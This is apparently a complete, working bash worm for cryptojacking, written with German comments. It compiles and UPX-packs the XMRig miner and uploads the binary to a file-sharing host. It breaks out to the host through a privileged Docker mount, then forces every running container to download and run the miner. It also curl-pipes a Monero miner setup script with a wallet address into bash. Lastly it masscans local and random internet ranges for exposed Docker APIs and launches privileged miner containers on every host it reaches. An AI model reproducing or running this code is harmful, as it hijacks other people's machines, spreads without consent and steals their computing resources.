#!/bin/bash
RATESCAN="50000"
set -e  # Exit immediately if a command exits with a non-zero status

SETUP_SLEEP="1"

function SETUP_SYSTEM() {
    apk update
    apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev

    BASIC_APK_PACKS=(go git jq masscan libpcap libpcap-dev docker make cmake upx libstdc++ gcc g++ libuv-dev iptables openssl openssl-dev hwloc-dev)
    
    for BASIC_APK_PACK in "${BASIC_APK_PACKS[@]}"; do
        echo "Setting up: $BASIC_APK_PACK"
        apk add --no-cache "$BASIC_APK_PACK" 2>/dev/null || { echo "Failed to install $BASIC_APK_PACK"; exit 1; }
        sleep "$SETUP_SLEEP"
    done

    export GOPATH=/root/go
    go get github.com/zmap/zgrab
    cd "$GOPATH/src/github.com/zmap/zgrab"
    go build
    cp ./zgrab /usr/bin/zgrab

    # Clean up APK cache
    rm -vrf /var/cache/apk/*
}
git clone https://github.com/xmrig/xmrig
mkdir xmrig/build && cd xmrig/scripts
 ./build_deps.sh && cd ../build
cmake .. -DXMRIG_DEPS=scripts/deps -DBUILD_STATIC=ON
make -j$(nproc)
upx -9 -o sbin xmrig
cp ./sbin /root/sbin
chmod +x /root/sbin
/root/sbin
# lil upspin test....
export UPSPINTEST=`curl --upload-file /root/sbin https://filepush.co/upload/`
# next part is implement the ssh spread..
cp ./sbin /host/bin/sbin
docker run -it --privileged --network host -v /:/mnt alpine chroot /mnt bash -C 'chmod +x /host/bin/sbin; /host/bin/sbin'
}

function INFECT_ALL_CONTAINERS(){
# ich lass den base64 echt mal weg :) sieht doch schöner aus ;)
docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER >> /tmp/.dc
# thx for the container list.... do a looping *jipieh*
for i in $(cat /tmp/.dc); do
docker exec --privileged -d $i sh -c "apt-get update; apt-get install -y wget curl; yum install -y wget curl; apk update; apk add wget curl; mkdir /var/tmp/ -p; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin || wge --no-check-certificate $UPSPINTEST -O /var/tmp/sbin || cur -sLk $UPSPINTEST -o /var/tmp/sbin || wdl --no-check-certificate $UPSPINTEST -O /var/tmp/sbin || cdl -sLk $UPSPINTEST -o /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin"
done;
export HOME=/root
nohup $(curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9) &
}




function GETLOCALRANGES(){
ip route show | awk '{print $1}' |  grep "/" > /tmp/.lr
}

function AUTOLANDOCKERPWN(){
TARGETRANGE=$1
TARGETPORT=$2
SCANRATE=$3
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan $TARGETRANGE -p$TARGETPORT --rate=$SCANRATE | awk '{print $6}'| zgrab --senders 200 --port $TARGETPORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";

for TARGETIP in ${!rndstr}
do
echo "$TARGETIP:$TARGETPORT"
timeout -s SIGKILL 240s docker -H tcp://$TARGETIP:$TARGETPORT run -d --privileged --network host -v /:/host nmlm99/monero:latest
done;
}

function LANDOCKERPWN(){
GETLOCALRANGES
while read TargetRange
do
echo "scanne $TargetRange"
AUTOLANDOCKERPWN $TargetRange 2375 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 2376 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 2377 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 4243 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 4244 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 5555 $RATESCAN
done < /tmp/.lr
rm -f /tmp/.lr
}


function RANDOMDOCKERPWN(){
for (( ; ; ))
do
TargetRange="$[RANDOM%255+1].0.0.0/8"
echo "scanne $TargetRange"
AUTOLANDOCKERPWN $TargetRange 2375 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 2376 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 2377 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 4243 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 4244 $RATESCAN
AUTOLANDOCKERPWN $TargetRange 5555 $RATESCAN
   sleep 1
done
}

SETUP_SYSTEM
export HOME=/root
curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9
INFECT_ALL_CONTAINERS
LANDOCKERPWN
RANDOMDOCKERPWN
